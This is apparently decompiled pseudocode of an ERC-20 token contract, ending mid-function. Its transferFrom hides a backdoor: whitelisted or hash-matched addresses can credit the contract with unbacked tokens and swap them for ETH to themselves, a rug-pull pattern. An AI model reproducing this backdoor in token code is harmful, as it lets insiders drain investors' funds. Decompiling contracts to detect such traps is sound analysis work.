contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor3;
uint256 _decimals;
uint256 _totalSupply;
uint256 _maxTx;
uint256 _fee;
array of struct stor8;
array of struct stor9;
uint256 stor10;
uint8 stor11;
address stor13;

function totalSupply() payable {
    return _totalSupply
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTx() payable {
    return _maxTx
}

function owner() payable {
    return owner
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    require owner == msg.sender
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require msg.sender
    require arg1
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    require msg.sender
    require arg1
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require allowance[address(msg.sender)][address(arg1)] >= arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 'NH{q', 17
    require msg.sender
    require arg1
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() payable {
    if bool(stor8.length):
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor8.length):
            if bool(stor8.length) == stor8.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor8.length.field_1:
                if 31 < stor8.length.field_1:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while stor8.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)])
                mem[128] = 256 * stor8.length.field_8
        else:
            if bool(stor8.length) == stor8.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor8.length.field_1:
                if 31 < stor8.length.field_1:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while stor8.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)])
                mem[128] = 256 * stor8.length.field_8
        mem[ceil32(stor8.length.field_1) + 192 len ceil32(stor8.length.field_1)] = mem[128 len ceil32(stor8.length.field_1)]
        if ceil32(stor8.length.field_1) > stor8.length.field_1:
            mem[ceil32(stor8.length.field_1) + stor8.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)], mem[(2 * ceil32(stor8.length.field_1)) + 192 len 2 * ceil32(stor8.length.field_1)]), 
    if bool(stor8.length) == stor8.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor8.length):
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor8.length.field_1:
            if 31 < stor8.length.field_1:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while stor8.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    else:
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor8.length.field_1:
            if 31 < stor8.length.field_1:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while stor8.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    mem[ceil32(stor8.length.field_1) + 192 len ceil32(stor8.length.field_1)] = mem[128 len ceil32(stor8.length.field_1)]
    if ceil32(stor8.length.field_1) > stor8.length.field_1:
        mem[ceil32(stor8.length.field_1) + stor8.length.field_1 + 192] = 0
    return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)], mem[(2 * ceil32(stor8.length.field_1)) + 192 len 2 * ceil32(stor8.length.field_1)]), 
}

function symbol() payable {
    if bool(stor9.length):
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor9.length):
            if bool(stor9.length) == stor9.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor9.length.field_1:
                if 31 < stor9.length.field_1:
                    mem[128] = uint256(stor9.field_0)
                    idx = 128
                    s = 0
                    while stor9.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor9[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)])
                mem[128] = 256 * stor9.length.field_8
        else:
            if bool(stor9.length) == stor9.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor9.length.field_1:
                if 31 < stor9.length.field_1:
                    mem[128] = uint256(stor9.field_0)
                    idx = 128
                    s = 0
                    while stor9.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor9[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)])
                mem[128] = 256 * stor9.length.field_8
        mem[ceil32(stor9.length.field_1) + 192 len ceil32(stor9.length.field_1)] = mem[128 len ceil32(stor9.length.field_1)]
        if ceil32(stor9.length.field_1) > stor9.length.field_1:
            mem[ceil32(stor9.length.field_1) + stor9.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)], mem[(2 * ceil32(stor9.length.field_1)) + 192 len 2 * ceil32(stor9.length.field_1)]), 
    if bool(stor9.length) == stor9.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor9.length):
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor9.length.field_1:
            if 31 < stor9.length.field_1:
                mem[128] = uint256(stor9.field_0)
                idx = 128
                s = 0
                while stor9.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor9[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)])
            mem[128] = 256 * stor9.length.field_8
    else:
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor9.length.field_1:
            if 31 < stor9.length.field_1:
                mem[128] = uint256(stor9.field_0)
                idx = 128
                s = 0
                while stor9.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor9[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)])
            mem[128] = 256 * stor9.length.field_8
    mem[ceil32(stor9.length.field_1) + 192 len ceil32(stor9.length.field_1)] = mem[128 len ceil32(stor9.length.field_1)]
    if ceil32(stor9.length.field_1) > stor9.length.field_1:
        mem[ceil32(stor9.length.field_1) + stor9.length.field_1 + 192] = 0
    return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)], mem[(2 * ceil32(stor9.length.field_1)) + 192 len 2 * ceil32(stor9.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg1
    require arg2
    if stor3[address(arg1)]:
        if stor10 >= arg3:
            if not stor11:
                require balanceOf[address(arg1)] >= arg3
            if arg3 < 0:
                revert with 'NH{q', 17
            if balanceOf[0] > -1:
                revert with 'NH{q', 17
            if balanceOf[address(arg1)] < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if stor3[address(msg.sender)]:
                if arg2 != arg1:
                    if not stor11:
                        require balanceOf[address(arg1)] >= arg3
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if balanceOf[address(this.address)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(this.address)] += arg3
                    require this.address
                    require stor13
                    allowance[address(this.address)][stor13] = arg3
                    emit Approval(arg3, this.address, stor13);
                    mem[128] = this.address
                    staticcall stor13.WETH() with:
                            gas gas_remaining wei
                    mem[192] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[160] = ext_call.return_data[12 len 20]
                    stor11 = 1
                    if block.timestamp > -21:
                        revert with 'NH{q', 17
                    mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                    mem[ceil32(return_data.size) + 196] = arg3
                    idx = 0
                    s = 128
                    t = ceil32(return_data.size) + 388
                    while idx < 2:
                        mem[t] = mem[s + 12 len 20]
                        idx = idx + 1
                        s = s + 32
                        t = t + 32
                        continue 
                    require ext_code.size(stor13)
                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                         gas gas_remaining wei
                        args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    stor11 = 0
            else:
                if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                    if not stor11:
                        require balanceOf[address(arg1)] >= arg3
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if arg2 != arg1:
                        if not stor11:
                            require balanceOf[address(arg1)] >= arg3
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if balanceOf[address(this.address)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += arg3
                        require this.address
                        require stor13
                        allowance[address(this.address)][stor13] = arg3
                        emit Approval(arg3, this.address, stor13);
                        mem[180] = this.address
                        staticcall stor13.WETH() with:
                                gas gas_remaining wei
                        mem[244] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[212] = ext_call.return_data[12 len 20]
                        stor11 = 1
                        if block.timestamp > -21:
                            revert with 'NH{q', 17
                        mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                        mem[ceil32(return_data.size) + 248] = arg3
                        idx = 0
                        s = 180
                        t = ceil32(return_data.size) + 440
                        while idx < 2:
                            mem[t] = mem[s + 12 len 20]
                            idx = idx + 1
                            s = s + 32
                            t = t + 32
                            continue 
                        require ext_code.size(stor13)
                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                             gas gas_remaining wei
                            args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        stor11 = 0
    else:
        if stor3[address(arg2)]:
            if stor10 >= arg3:
                if not stor11:
                    require balanceOf[address(arg1)] >= arg3
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor3[address(msg.sender)]:
                    if arg2 != arg1:
                        if not stor11:
                            require balanceOf[address(arg1)] >= arg3
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if balanceOf[address(this.address)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += arg3
                        require this.address
                        require stor13
                        allowance[address(this.address)][stor13] = arg3
                        emit Approval(arg3, this.address, stor13);
                        mem[128] = this.address
                        staticcall stor13.WETH() with:
                                gas gas_remaining wei
                        mem[192] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[160] = ext_call.return_data[12 len 20]
                        stor11 = 1
                        if block.timestamp > -21:
                            revert with 'NH{q', 17
                        mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                        mem[ceil32(return_data.size) + 196] = arg3
                        idx = 0
                        s = 128
                        t = ceil32(return_data.size) + 388
                        while idx < 2:
                            mem[t] = mem[s + 12 len 20]
                            idx = idx + 1
                            s = s + 32
                            t = t + 32
                            continue 
                        require ext_code.size(stor13)
                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                             gas gas_remaining wei
                            args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        stor11 = 0
                else:
                    if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if not stor11:
                            require balanceOf[address(arg1)] >= arg3
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg2 != arg1:
                            if not stor11:
                                require balanceOf[address(arg1)] >= arg3
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if balanceOf[address(this.address)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(this.address)] += arg3
                            require this.address
                            require stor13
                            allowance[address(this.address)][stor13] = arg3
                            emit Approval(arg3, this.address, stor13);
                            mem[180] = this.address
                            staticcall stor13.WETH() with:
                                    gas gas_remaining wei
                            mem[244] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[212] = ext_call.return_data[12 len 20]
                            stor11 = 1
                            if block.timestamp > -21:
                                revert with 'NH{q', 17
                            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                            mem[ceil32(return_data.size) + 248] = arg3
                            idx = 0
                            s = 180
                            t = ceil32(return_data.size) + 440
                            while idx < 2:
                                mem[t] = mem[s + 12 len 20]
                                idx = idx + 1
                                s = s + 32
                                t = t + 32
                                continue 
                            require ext_code.size(stor13)
                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                 gas gas_remaining wei
                                args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            stor11 = 0
        else:
            if sha3(arg2) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                if stor10 >= arg3:
                    if not stor11:
                        require balanceOf[address(arg1)] >= arg3
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor3[address(msg.sender)]:
                        if arg2 != arg1:
                            if not stor11:
                                require balanceOf[address(arg1)] >= arg3
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if balanceOf[address(this.address)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(this.address)] += arg3
                            require this.address
                            require stor13
                            allowance[address(this.address)][stor13] = arg3
                            emit Approval(arg3, this.address, stor13);
                            mem[180] = this.address
                            staticcall stor13.WETH() with:
                                    gas gas_remaining wei
                            mem[244] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[212] = ext_call.return_data[12 len 20]
                            stor11 = 1
                            if block.timestamp > -21:
                                revert with 'NH{q', 17
                            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                            mem[ceil32(return_data.size) + 248] = arg3
                            idx = 0
                            s = 180
                            t = ceil32(return_data.size) + 440
                            while idx < 2:
                                mem[t] = mem[s + 12 len 20]
                                idx = idx + 1
                                s = s + 32
                                t = t + 32
                                continue 
                            require ext_code.size(stor13)
                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                 gas gas_remaining wei
                                args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            stor11 = 0
                    else:
                        if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if not stor11:
                                require balanceOf[address(arg1)] >= arg3
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg2 != arg1:
                                if not stor11:
                                    require balanceOf[address(arg1)] >= arg3
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if balanceOf[address(this.address)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(this.address)] += arg3
                                require this.address
                                require stor13
                                allowance[address(this.address)][stor13] = arg3
                                emit Approval(arg3, this.address, stor13);
                                mem[232] = this.address
                                staticcall stor13.WETH() with:
                                        gas gas_remaining wei
                                mem[296] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[264] = ext_call.return_data[12 len 20]
                                stor11 = 1
                                if block.timestamp > -21:
                                    revert with 'NH{q', 17
                                mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                mem[ceil32(return_data.size) + 300] = arg3
                                idx = 0
                                s = 232
                                t = ceil32(return_data.size) + 492
                                while idx < 2:
                                    mem[t] = mem[s + 12 len 20]
                                    idx = idx + 1
                                    s = s + 32
                                    t = t + 32
                                    continue 
                                require ext_code.size(stor13)
                                call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                     gas gas_remaining wei
                                    args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                stor11 = 0
            else:
                if arg2 == this.address:
                    if stor10 >= arg3:
                        if not stor11:
                            require balanceOf[address(arg1)] >= arg3
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor3[address(msg.sender)]:
                            if arg2 != arg1:
                                if not stor11:
                                    require balanceOf[address(arg1)] >= arg3
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if balanceOf[address(this.address)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(this.address)] += arg3
                                require this.address
                                require stor13
                                allowance[address(this.address)][stor13] = arg3
                                emit Approval(arg3, this.address, stor13);
                                mem[180] = this.address
                                staticcall stor13.WETH() with:
                                        gas gas_remaining wei
                                mem[244] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[212] = ext_call.return_data[12 len 20]
                                stor11 = 1
                                if block.timestamp > -21:
                                    revert with 'NH{q', 17
                                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                mem[ceil32(return_data.size) + 248] = arg3
                                idx = 0
                                s = 180
                                t = ceil32(return_data.size) + 440
                                while idx < 2:
                                    mem[t] = mem[s + 12 len 20]
                                    idx = idx + 1
                                    s = s + 32
                                    t = t + 32
                                    continue 
                                require ext_code.size(stor13)
                                call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                     gas gas_remaining wei
                                    args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                stor11 = 0
                        else:
                            if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if not stor11:
                                    require balanceOf[address(arg1)] >= arg3
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg2 != arg1:
                                    if not stor11:
                                        require balanceOf[address(arg1)] >= arg3
                                    if arg3 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if balanceOf[address(this.address)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(this.address)] += arg3
                                    require this.address
                                    require stor13
                                    allowance[address(this.address)][stor13] = arg3
                                    emit Approval(arg3, this.address, stor13);
                                    mem[232] = this.address
                                    staticcall stor13.WETH() with:
                                            gas gas_remaining wei
                                    mem[296] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[264] = ext_call.return_data[12 len 20]
                                    stor11 = 1
                                    if block.timestamp > -21:
                                        revert with 'NH{q', 17
                                    mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                    mem[ceil32(return_data.size) + 300] = arg3
                                    idx = 0
                                    s = 232
                                    t = ceil32(return_data.size) + 492
                                    while idx < 2:
                                        mem[t] = mem[s + 12 len 20]
                                        idx = idx + 1
                                        s = s + 32
                                        t = t + 32
                                        continue 
                                    require ext_code.size(stor13)
                                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                         gas gas_remaining wei
                                        args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    stor11 = 0
                else:
                    if stor11:
                        if stor10 >= arg3:
                            if not stor11:
                                require balanceOf[address(arg1)] >= arg3
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor3[address(msg.sender)]:
                                if arg2 != arg1:
                                    if not stor11:
                                        require balanceOf[address(arg1)] >= arg3
                                    if arg3 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if balanceOf[address(this.address)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(this.address)] += arg3
                                    require this.address
                                    require stor13
                                    allowance[address(this.address)][stor13] = arg3
                                    emit Approval(arg3, this.address, stor13);
                                    mem[180] = this.address
